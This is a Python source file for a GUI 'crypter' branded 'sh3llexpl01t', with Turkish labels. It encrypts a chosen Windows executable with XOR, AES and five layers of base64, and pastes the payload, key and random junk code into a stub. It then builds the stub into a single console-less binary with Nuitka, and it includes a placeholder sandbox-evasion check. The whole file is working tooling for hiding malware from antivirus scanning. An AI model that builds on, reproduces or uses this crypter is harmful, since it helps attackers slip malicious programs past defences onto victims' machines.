import tkinter as tk
from tkinter import filedialog, messagebox
import os
import base64
import random
import string
import subprocess
from Cryptodome.Cipher import AES
import hashlib
import platform

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_key(length=32):
    return os.urandom(length)

def aes_encrypt(data, key):
    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + tag + ciphertext

def aes_decrypt(data, key):
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(hashlib.sha256(key).digest(), AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def multi_layer_base64(data, layers=5):
    for _ in range(layers):
        data = base64.b64encode(data)
    return data

def insert_junk_code():
    return f"{generate_random_string(10)} = '{generate_random_string(15)}'\n"


def is_sandbox():
    return False  

class CrypterGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Crypter")
        self.root.geometry("600x400")
        self.root.configure(bg="#1a1a1a")
        
        self.stub_path = tk.StringVar()
        self.input_file = tk.StringVar()
        self.output_dir = tk.StringVar()
        
        tk.Label(root, text="sh3llexpl01t", font=("Arial", 16, "bold"), bg="#1a1a1a", fg="#ff4444").pack(pady=10)
        
        tk.Label(root, text="Stub Dosyası (.py):", bg="#1a1a1a", fg="white").pack()
        tk.Entry(root, textvariable=self.stub_path, width=50).pack(pady=5)
        tk.Button(root, text="Stub Seç", command=self.select_stub, bg="#ff4444", fg="white").pack()
        
        tk.Label(root, text="Şifrelenecek Dosya (.exe):", bg="#1a1a1a", fg="white").pack()
        tk.Entry(root, textvariable=self.input_file, width=50).pack(pady=5)
        tk.Button(root, text="Dosya Seç", command=self.select_file, bg="#ff4444", fg="white").pack()
        
        tk.Label(root, text="Çıkış Klasörü:", bg="#1a1a1a", fg="white").pack()
        tk.Entry(root, textvariable=self.output_dir, width=50).pack(pady=5)
        tk.Button(root, text="Klasör Seç", command=self.select_output_dir, bg="#ff4444", fg="white").pack()
        
        tk.Button(root, text="Şifrele ve Build Et", command=self.encrypt_and_build, bg="#00cc00", fg="white", font=("Arial", 12, "bold")).pack(pady=20)
    
    def select_stub(self):
        path = filedialog.askopenfilename(filetypes=[("Python Files", "*.py")])
        if path:
            self.stub_path.set(path)
    
    def select_file(self):
        path = filedialog.askopenfilename(filetypes=[("Executable Files", "*.exe")])
        if path:
            self.input_file.set(path)
    
    def select_output_dir(self):
        path = filedialog.askdirectory()
        if path:
            self.output_dir.set(path)
    
    def encrypt_and_build(self):
        if not self.stub_path.get() or not self.input_file.get() or not self.output_dir.get():
            messagebox.showerror("Hata", "Lütfen tüm alanları doldurun")
            return
        
        try:
            with open(self.input_file.get(), "rb") as f:
                original_data = f.read()
            
            key = generate_key()
            encrypted_data = aes_encrypt(xor_encrypt(original_data, key), key)
            encoded_data = multi_layer_base64(encrypted_data, layers=5)
            
            with open(self.stub_path.get(), "r", encoding="utf-8") as f:
                stub_code = f.read()
            
            stub_code = stub_code.replace("#<JUNK>", insert_junk_code() * 5)
            stub_code = stub_code.replace("#<BASE64>", encoded_data.decode())
            stub_code = stub_code.replace("#<KEY>", base64.b64encode(key).decode())
            
            output_file = os.path.join(self.output_dir.get(), "final_crypted.py")
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(stub_code)
            
            key_file = os.path.join(self.output_dir.get(), "payload.key")
            with open(key_file, "wb") as keyfile:
                keyfile.write(key)
            
            
            nuitka_cmd = [
                "nuitka",
                "--onefile",
                "--remove-output",
                "--output-dir=" + self.output_dir.get(),
                output_file
            ]
            if platform.system() == "Windows":
                nuitka_cmd.append("--windows-disable-console")
            else:
                pass
            
            subprocess.run(nuitka_cmd, check=True)
            messagebox.showinfo("Başarılı", "Şifreleme ve build tamamlandı! Çıkış: " + self.output_dir.get())
        except Exception as e:
            messagebox.showerror("Hata", f"oldu: {str(e)}")

if __name__ == "__main__":
    if is_sandbox():
        print("sandbox'ta çalışmam")
        exit()
    root = tk.Tk()
    app = CrypterGUI(root)
    root.mainloop()
